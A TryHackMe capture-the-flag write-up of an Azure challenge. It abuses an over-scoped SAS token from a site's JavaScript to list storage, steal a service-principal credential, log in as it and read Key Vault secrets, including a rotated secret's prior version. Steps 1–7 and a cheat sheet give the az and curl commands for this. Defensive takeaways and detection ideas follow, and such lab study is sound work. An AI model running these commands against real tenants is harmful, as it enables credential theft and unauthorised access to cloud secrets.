## CTF Writeup — "CryptoCabana" Azure SAS → Key Vault Version History (TryHackMe)
### TryHackMe · Hacker Holidays · Cloud / Azure · Medium (90 pts) · over-scoped SAS token → hidden container → service principal → Key Vault → rotated-secret recovery

**Flag:** `THM{REDACTED}`

---

## TL;DR

A static "seed-phrase backup" site on **Azure Storage** ships a **SAS token in its
client-side JavaScript** that is over-scoped — it grants **read + list** across the
whole account, not just the write the app needs. Listing reveals a hidden `vault`
container holding a **service-principal credential**, which unlocks an **Azure Key
Vault**. The flag is split across three secret "shards" — and the middle one was
**rotated**, so its current value is a decoy and the real piece lives in the
secret's **previous version**. The whole room is about following delegated trust
further than intended, then reading a secret's history.

---

## The attack chain

```
Static site on Azure Storage (*.web.core.windows.net)
        │
        ▼
app.js hands out a SAS token — permissions sp=rl (READ + LIST), not just write
        │
        ▼
List containers  →  a hidden 'vault' container the app never mentions
        │
        ▼
vault/backup-service-account.json  →  a SERVICE PRINCIPAL credential + Key Vault name
        │
        ▼
az login as the service principal  →  read access to the Key Vault
        │
        ▼
Secrets: key-shard-1/2/3 (+ locked master-key)
        │
        ▼
shard-2 was ROTATED → current value is a taunt → read its PREVIOUS version
        │
        ▼
Concatenate shard-1 + shard-2(old) + shard-3  →  FLAG
```

Maps to the briefing: "what the kiosk is quietly trusting to reach into storage"
(the SAS token), "follow that trust somewhere the page never points you" (the
hidden container), "a second, more valuable set of keys" (the service principal),
and "a vault that won't give up the real values on the first ask" (the rotated
secret's version history — Mia's "what did it look like five minutes before").

---

## Background: the Azure pieces

- **Azure Storage static website** — a `*.z13.web.core.windows.net` URL is a static
  site hosted straight out of a Storage account's `$web` container. The same
  account can hold other containers too.
- **SAS token (Shared Access Signature)** — a long query string appended to a
  storage URL that grants scoped, time-limited access without a full account key.
  Its power is encoded in its parameters (below). Because it lives in client-side
  JS, anyone can read and reuse it.
- **Service principal** — a non-human Azure identity (like an AWS IAM role/service
  account): a `client_id` + `client_secret` + `tenant_id` you can log in as.
- **Azure Key Vault** — a managed secret store. Crucially, it keeps **version
  history**: every time a secret is updated, the old value is retained as a prior
  version you can still read.

### Reading a SAS token

The token in `app.js` was:

```
?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-...&sig=...
```

- `ss=b` — **s**ervice**s**: blob.
- `srt=sco` — **r**esource **t**ypes: **s**ervice + **c**ontainer + **o**bject
  (so it can enumerate at every level).
- `sp=rl` — **p**ermissions: **r**ead + **l**ist.

The app only ever does `PUT` (upload a backup), so it needed `w` (write) at most.
Granting **read + list at service/container/object scope** is the vulnerability: it
lets anyone read and enumerate the entire account. That's "what the kiosk is
quietly trusting to reach into storage on its own."

## Scope note

THM-provisioned Azure subscription (`Az-Subs-CTF`); worked from the provided Cloud
Shell with the scoped lab identity. In-scope lab environment.

## Step 1 — Read the client-side handout

```bash
curl -s https://<site>.z13.web.core.windows.net/app.js
```

`app.js` reveals the storage account name, the `backups` container, and the SAS
token (with its over-scoped `sp=rl&srt=sco` permissions). Client-side JS is never
secret — anything the browser needs, an attacker reads too.

## Step 2 — List containers (follow the trust)

The app only mentions `backups`, but the SAS's `list` permission lets us enumerate
*all* containers. (Strip the leading `?` from the SAS for `--sas-token`.)

```bash
SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=...&sig=...'

az storage container list --account-name <acct> --sas-token "$SAS" -o table
```

Result — three containers:

```
$web        ← the static site itself
backups     ← what the app advertises
vault       ← never mentioned anywhere on the page
```

`vault` is "somewhere the kiosk's own page never once points you."

## Step 3 — Loot the hidden container

```bash
az storage blob list --account-name <acct> --container-name vault --sas-token "$SAS" -o table
```

Two blobs: `seed_phrase.txt` (a decoy) and **`backup-service-account.json`** — the
real prize. Download and read it:

```bash
az storage blob download --account-name <acct> --container-name vault \
  --name backup-service-account.json --sas-token "$SAS" --file sa.json --no-progress
cat sa.json
```

```json
{ "client_id":"...", "client_secret":"...", "tenant_id":"...",
  "key_vault_name":"ccabana-kv-...", "key_vault_uri":"https://ccabana-kv-....vault.azure.net/",
  "note":"Rotate this if it ever leaves the vault. -- IT" }
```

A full **service-principal credential** *and* the Key Vault name. (The note is the
challenge winking — it left the vault and was never rotated.)

## Step 4 — Authenticate as the service principal

```bash
az login --service-principal \
  --username "<client_id>" --password "<client_secret>" --tenant "<tenant_id>"
```

The output shows `"type": "servicePrincipal"` — the CLI is now this identity, which
has Key Vault access the original user lacked. (The Cloud Shell *prompt* still shows
your username; that's cosmetic — `az account show` confirms the active identity.)

## Step 5 — Enumerate the Key Vault

```bash
az keyvault secret list --vault-name "<vault>" -o table
```

```
key-shard-1
key-shard-2
key-shard-3
master-key   (expired 2020 — a decoy; reading it returns ForbiddenByRbac anyway)
```

The service principal can **list** but not read every secret — `master-key` is
denied (`ForbiddenByRbac`). The readable path is the **shards**, which combine into
the flag.

## Step 6 — Read the shards

```bash
az keyvault secret show --vault-name "<vault>" --name key-shard-1 --query value -o tsv   # THM{n0t_ur
az keyvault secret show --vault-name "<vault>" --name key-shard-3 --query value -o tsv   # ur_c01ns!}
az keyvault secret show --vault-name "<vault>" --name key-shard-2 --query value -o tsv   # a "Rotated this..." taunt
```

Shards 1 and 3 give the head and tail. **Shard 2's current value is a decoy** — a
message: *"Rotated this after IT flagged it — old value should still be recoverable
if you know where to look."* That's Mia's hint made literal.

## Step 7 — Recover the rotated secret's previous version

Key Vault retains version history. List the versions and read the **earliest**:

```bash
# grab the oldest version's id and read it in one shot
OLD=$(az keyvault secret list-versions --vault-name "<vault>" --name key-shard-2 \
  --query "sort_by([], &attributes.created)[0].id" -o tsv)
az keyvault secret show --id "$OLD" --query value -o tsv
```

- `sort_by([], &attributes.created)[0]` picks the earliest-created version.
- Reading *that version's* value returns the true middle shard (the pre-rotation
  value): `_k3ys_n0t_`.

## Step 8 — Assemble the flag

```
key-shard-1        : THM{n0t_ur
key-shard-2 (old)  : _k3ys_n0t_
key-shard-3        : ur_c01ns!}
                     ───────────────────────────────
                     THM{REDACTED}
```

The plaintext reads as the crypto maxim "not your keys, not your coins" — fitting
for a seed-phrase-stealing kiosk.

---

## Root cause

- **Over-scoped SAS token in client-side code** — the app needed write-only for one
  container but issued read+list across the whole account (`sp=rl`, `srt=sco`),
  readable by anyone who views the page source.
- **Sensitive blob in a listable account** — a service-principal credential sat in a
  container reachable via the same over-scoped token.
- **Long-lived, unrotated credential** — the service principal "left the vault" and
  was never rotated, exactly as its own note warned.
- **Secret history exposed** — the flag's real value survived a "rotation" because
  Key Vault keeps prior versions, and the identity could read them.

## Defensive takeaways

- **Least-privilege SAS.** Scope to the exact permission (`sp=w` here), the single
  container/object (`srt=o` or `co`), and a short expiry. Never `rl` at service
  scope for a write-only feature.
- **Don't embed credentials in client code.** A browser "backup" feature should call
  a backend that holds the credential; the client should never carry a storage
  token that can list the account.
- **Rotate on exposure — and purge history.** If a secret leaks, rotating forward
  isn't enough when prior versions remain readable; disable/destroy old versions and
  tighten who can read version history.
- **Segregate sensitive blobs.** A service-principal credential should never live in
  a storage container reachable by a public SAS.

## Detection opportunities

- **Anomalous SAS usage** — `ListContainers` / `ListBlobs` calls using a SAS that
  the application only ever uses for `PutBlob` is a strong misuse signal (Storage
  Analytics / diagnostic logs).
- **Service-principal sign-in from an unexpected location/IP**, especially one whose
  credential was stored in blob storage (Entra ID sign-in logs).
- **Key Vault access-history reads** — `SecretList` followed by `SecretGet` on
  *previous versions* is unusual for automation and worth alerting on (Key Vault
  diagnostic logs).

## Command cheat-sheet

```
# read the client handout
curl -s https://<site>.z13.web.core.windows.net/app.js

# enumerate with the leaked SAS (strip the leading '?')
az storage container list --account-name <acct> --sas-token "$SAS" -o table
az storage blob list --account-name <acct> --container-name vault --sas-token "$SAS" -o table
az storage blob download --account-name <acct> --container-name vault --name <blob> --sas-token "$SAS" --file out --no-progress

# become the service principal, hit Key Vault
az login --service-principal --username <id> --password <secret> --tenant <tenant>
az keyvault secret list --vault-name <vault> -o table
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv

# recover a rotated secret's previous version
OLD=$(az keyvault secret list-versions --vault-name <vault> --name <secret> --query "sort_by([], &attributes.created)[0].id" -o tsv)
az keyvault secret show --id "$OLD" --query value -o tsv
```

## Two things worth remembering

1. **Read the SAS permissions, not just the fact that there's a SAS.** `sp=rl` +
   `srt=sco` on a write-only feature *is* the vulnerability — it turns "upload your
   backup" into "list and read the whole account."
2. **Rotation isn't deletion.** Azure Key Vault keeps every prior version; a secret
   "rotated" to hide it is still readable in history by anyone who can read the
   vault. When a value looks freshly rotated, check what it was five minutes before.

*Target, credentials, and the subscription are fictional challenge material in a
sandboxed lab; all actions performed with the provided lab identity.*
